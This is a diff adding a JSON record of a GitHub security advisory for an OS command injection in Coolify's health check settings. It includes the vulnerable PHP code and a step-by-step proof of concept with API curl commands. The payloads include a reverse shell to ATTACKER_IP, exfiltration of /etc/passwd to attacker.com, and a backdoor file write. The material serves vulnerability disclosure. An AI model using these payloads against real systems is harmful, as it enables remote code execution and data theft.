@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-4fhp-xqqp-w7vv",
+  "repo": {
+    "cve_id": "CVE-2026-59734",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nA critical OS command injection vulnerability exists in Coolify's health check configuration handling. The `health_check_host`, `health_check_method`, and `health_check_path` parameters are directly interpolated into shell commands without proper sanitization, allowing any authenticated user to execute arbitrary commands inside deployment containers.\r\n\r\n**Impact:** Remote Code Execution (RCE) in all deployed application containers.\r\n**Severity:** Critical (CVSS 8.8)\r\n\r\n---\r\n\r\n### Details\r\n\r\n**Vulnerable File:** `app/Jobs/ApplicationDeploymentJob.php`  \r\n**Vulnerable Function:** `generate_healthcheck_commands()`  \r\n**Vulnerable Lines:** 2762-2768\r\n\r\n#### Vulnerable Code:\r\n\r\n```php\r\n// Lines 2750-2773 in ApplicationDeploymentJob.php\r\n\r\nprivate function generate_healthcheck_commands()\r\n{\r\n    if (! $this->application->health_check_port) {\r\n        $health_check_port = $this->application->ports_exposes_array[0];\r\n    } else {\r\n        $health_check_port = $this->application->health_check_port;\r\n    }\r\n    \r\n    if ($this->application->health_check_path) {\r\n        $this->full_healthcheck_url = \"{$this->application->health_check_method}: {$this->application->health_check_scheme}://{$this->application->health_check_host}:{$health_check_port}{$this->application->health_check_path}\";\r\n        $generated_healthchecks_commands = [\r\n            // VULNERABLE: No escapeshellarg() on user-controlled inputs!\r\n            \"curl -s -X {$this->application->health_check_method} -f {$this->application->health_check_scheme}://{$this->application->health_check_host}:{$health_check_port}{$this->application->health_check_path} > /dev/null || wget -q -O- {$this->application->health_check_scheme}://{$this->application->health_check_host}:{$health_check_port}{$this->application->health_check_path} > /dev/null || exit 1\",\r\n        ];\r\n    } else {\r\n        // Same vulnerability on line 2768\r\n        $generated_healthchecks_commands = [\r\n            \"curl -s -X {$this->application->health_check_method} -f {$this->application->health_check_scheme}://{$this->application->health_check_host}:{$health_check_port}/ > /dev/null || wget -q -O- {$this->application->health_check_scheme}://{$this->application->health_check_host}:{$health_check_port}/ > /dev/null || exit 1\",\r\n        ];\r\n    }\r\n    return implode(' ', $generated_healthchecks_commands);\r\n}\r\n```\r\n\r\n#### Root Cause:\r\nThe user-controlled properties `health_check_host`, `health_check_method`, and `health_check_path` are directly interpolated into a shell command string without using `escapeshellarg()` or any input validation. This allows shell metacharacters like `;`, `|`, `$()`, and `` ` `` to break out of the intended command and execute arbitrary commands.\r\n\r\n---\r\n\r\n### PoC (Proof of Concept)\r\n\r\n#### Prerequisites:\r\n- Authenticated user account on Coolify instance\r\n- Permission to create/edit applications\r\n\r\n#### Step 1: Identify Vulnerable Endpoint\r\n\r\nThe vulnerability can be exploited via:\r\n- Web UI: Project → Application → Settings → Health Checks\r\n- API Endpoint: `PATCH /api/v1/applications/{uuid}`\r\n\r\n#### Step 2: Craft Malicious Payload\r\n\r\nSet `health_check_host` to:\r\n```\r\nlocalhost; id > /tmp/pwned #\r\n```\r\n\r\n#### Step 3: Exploit via API\r\n\r\n```bash\r\n# Replace with actual values\r\nCOOLIFY_URL=\"https://your-coolify-instance\"\r\nAPI_TOKEN=\"your-api-token\"\r\nAPP_UUID=\"your-application-uuid\"\r\n\r\n# Inject malicious health check configuration\r\ncurl -X PATCH \"${COOLIFY_URL}/api/v1/applications/${APP_UUID}\" \\\r\n  -H \"Authorization: Bearer ${API_TOKEN}\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\r\n    \"health_check_enabled\": true,\r\n    \"health_check_host\": \"localhost; id > /tmp/pwned #\",\r\n    \"health_check_path\": \"/health\",\r\n    \"health_check_method\": \"GET\",\r\n    \"health_check_scheme\": \"http\"\r\n  }'\r\n\r\n# Trigger deployment to execute the health check\r\ncurl -X POST \"${COOLIFY_URL}/api/v1/applications/${APP_UUID}/restart\" \\\r\n  -H \"Authorization: Bearer ${API_TOKEN}\"\r\n```\r\n\r\n#### Step 4: Verify Exploitation\r\n\r\nAfter deployment completes, check for command execution:\r\n```bash\r\n# The file /tmp/pwned should contain output of 'id' command\r\ndocker exec <container_name> cat /tmp/pwned\r\n# Expected output: uid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\n#### Step 5: Advanced Payloads\r\n\r\n**Reverse Shell:**\r\n```json\r\n{\r\n  \"health_check_host\": \"localhost; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' #\"\r\n}\r\n```\r\n\r\n**Data Exfiltration:**\r\n```json\r\n{\r\n  \"health_check_host\": \"localhost; curl http://attacker.com/exfil?data=$(cat /etc/passwd|base64|tr -d '\\\\n') #\"\r\n}\r\n```\r\n\r\n**File Write:**\r\n```json\r\n{\r\n  \"health_check_host\": \"localhost; echo 'malicious content' > /app/backdoor.php #\"\r\n}\r\n```\r\n\r\n#### Local Validation Script\r\n\r\nSave and run this script to validate the vulnerability pattern:\r\n\r\n```bash\r\n#!/bin/bash\r\n# Simulates the exact vulnerable code pattern\r\n\r\nTEST_DIR=\"/tmp/coolify_vuln_test\"\r\nmkdir -p \"$TEST_DIR\"\r\n\r\n# Malicious user input\r\nHEALTH_CHECK_HOST=\"localhost; echo 'PWNED' > ${TEST_DIR}/proof.txt #\"\r\nHEALTH_CHECK_METHOD=\"GET\"\r\nHEALTH_CHECK_SCHEME=\"http\"\r\nHEALTH_CHECK_PORT=\"8080\"\r\nHEALTH_CHECK_PATH=\"/health\"\r\n\r\n# Vulnerable command generation (same as Coolify)\r\nVULNERABLE_CMD=\"curl -s -X ${HEALTH_CHECK_METHOD} -f ${HEALTH_CHECK_SCHEME}://${HEALTH_CHECK_HOST}:${HEALTH_CHECK_PORT}${HEALTH_CHECK_PATH} > /dev/null || exit 1\"\r\n\r\necho \"Executing: $VULNERABLE_CMD\"\r\neval \"$VULNERABLE_CMD\" 2>/dev/null\r\n\r\n# Check if injection worked\r\nif [ -f \"${TEST_DIR}/proof.txt\" ]; then\r\n    echo \"✅ VULNERABLE: Command injection successful!\"\r\n    echo \"Proof: $(cat ${TEST_DIR}/proof.txt)\"\r\nelse\r\n    echo \"❌ File not created\"\r\nfi\r\n\r\nrm -rf \"$TEST_DIR\"\r\n```\r\n\r\n---\r\n\r\n### Impact\r\n\r\n**Who is affected:**\r\n- All Coolify users who deploy applications with health checks enabled\r\n- Self-hosted Coolify instances\r\n- Coolify Cloud users (if applicable)\r\n\r\n**What an attacker can do:**\r\n1. **Remote Code Execution** - Execute arbitrary commands inside deployment containers\r\n2. **Container Escape** - Potentially escape to host if containers run privileged\r\n3. **Data Theft** - Access application secrets, environment variables, databases\r\n4. **Lateral Movement** - Attack other containers in the Docker network\r\n5. **Supply Chain Attack** - Inject backdoors into deployed applications\r\n6. **Denial of Service** - Crash or stop application containers\r\n\r\n**Attack Requirements:**\r\n- Authenticated user account (any privilege level that can edit applications)\r\n- No special configuration needed - default installations are vulnerable\r\n\r\n---",
+    "ghsa_id": "GHSA-4fhp-xqqp-w7vv",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-4fhp-xqqp-w7vv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4fhp-xqqp-w7vv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-59734"
+      }
+    ],
+    "published_at": "2026-07-02T13:35:48Z",
+    "references": [],
+    "severity": "high",
+    "summary": "OS Command Injection in Health Check Configuration Allows Remote Code Execution",
+    "updated_at": "2026-07-07T15:34:51Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": ">= v4.0.0-beta.469",
+        "vulnerable_version_range": "<= 4.0.0-beta.460"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
